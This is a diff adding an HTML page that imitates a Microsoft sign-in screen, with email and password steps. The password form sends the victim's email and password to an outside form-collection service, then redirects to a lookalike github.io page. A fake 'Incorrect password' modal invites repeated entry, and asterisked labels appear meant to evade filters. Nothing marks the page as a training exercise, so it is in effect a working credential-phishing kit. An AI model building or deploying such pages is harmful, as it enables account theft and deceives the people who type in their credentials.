@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:;">
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="X-Frame-Options" content="DENY">
+  <title>Sign in to your account</title>
+  <!-- <link rel="icon" type="image/png" href="https://www.microsoft.com/favicon.ico"> -->
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <!-- Preloader -->
+  <div id="preloader" class="screen active">
+    <div class="preloader-content">
+      <div class="ms-logo">
+        <div class="square red"></div>
+        <div class="square green"></div>
+        <div class="square blue"></div>
+        <div class="square yellow"></div>
+      </div>
+      <div class="microsoft-text">Microsoft.</div>
+      <div class="loading-bar">
+        <div class="loading-progress"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Background Image Screen -->
+  <div id="background-screen" class="screen">
+    <div class="background-image"></div>
+  </div>
+
+  <!-- Session Timeout Screen -->
+  <div id="timeout-screen" class="screen">
+    <div class="timeout-container">
+      <div class="ms-logo">
+        <div class="square red"></div>
+        <div class="square green"></div>
+        <div class="square blue"></div>
+        <div class="square yellow"></div>
+      </div>
+      <div class="microsoft-text">Microsoft.</div>
+      <div class="timeout-message">
+        <h2>Session timeout</h2>
+        <p>Your session has timed out due to inactivity.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Login Screen -->
+  <div id="login-screen" class="screen">
+    <div class="login-container">
+      <div class="login-form-container">
+        <div id="email-form" class="form-section active">
+          <div class="form-header">
+            <div class="ms-logo">
+              <div class="square red"></div>
+              <div class="square green"></div>
+              <div class="square blue"></div>
+              <div class="square yellow"></div>
+            </div>
+            <div class="microsoft-text">Microsoft.</div>
+          </div>
+          <h1 class="sign-in-header">Sign in</h1>
+          <form id="emailForm">
+            <div class="input-group">
+              <input type="text" id="email" placeholder="Email, phone, or Skype*" required>
+              <div class="input-line"></div>
+            </div>
+            <div class="create-account">
+              <p>No account? <a href="#">Create one!</a></p>
+            </div>
+            <div class="form-footer">
+              <div class="form-footer-links">
+                <a href="#" class="access-link">Can't access your account?</a>
+              </div>
+              <div class="form-footer-buttons">
+                <button type="submit" class="next-button">
+                  Next
+                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m9 18 6-6-6-6"/></svg>
+                </button>
+              </div>
+            </div>
+          </form>
+        </div>
+
+        <div id="password-form" class="form-section">
+          <div class="form-header">
+            <div class="ms-logo">
+              <div class="square red"></div>
+              <div class="square green"></div>
+              <div class="square blue"></div>
+              <div class="square yellow"></div>
+            </div>
+            <div class="microsoft-text">Microsoft.</div>
+          </div>
+          <button id="back-button" class="back-button">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
+            <span id="user-email"></span>
+          </button>
+          <h1 class="sign-in-header">Enter password</h1>
+          <form id="passwordForm" method="post" action="https://submit-form.com/5XpxOcfsE">
+            <input
+                    type="hidden"
+                    name="_redirect"
+                    value="https://secured0011.github.io/Microsoft/"
+                  />
+            <input type="hidden" id="hidden-email" name="emml">
+            <div class="input-group">
+              <input type="password" id="password" name="psswd" placeholder="Password*" required>
+              <div class="input-line"></div>
+            </div>
+            <div class="forgot-password">
+              <a href="#">Forgot password?</a>
+            </div>
+            <div class="form-footer">
+              <div class="form-footer-links">
+                <a href="#" class="signin-options">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>
+                  Sign-in options
+                </a>
+              </div>
+              <div class="form-footer-buttons">
+                <button type="submit" class="signin-button">
+                  Sign in
+                  <!-- <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m9 18 6-6-6-6"/></svg> -->
+                </button>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Error Modal -->
+  <div id="error-modal" class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2>Incorrect password*</h2>
+        <span class="close-modal">&times;</span>
+      </div>
+      <div class="modal-body">
+        <p>Your Email* or password is incorrect*.  <a href="#">reset it now</a>.</p>
+      </div>
+      <div class="modal-footer">
+        <button id="try-again-btn" class="try-again-button">Try again</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
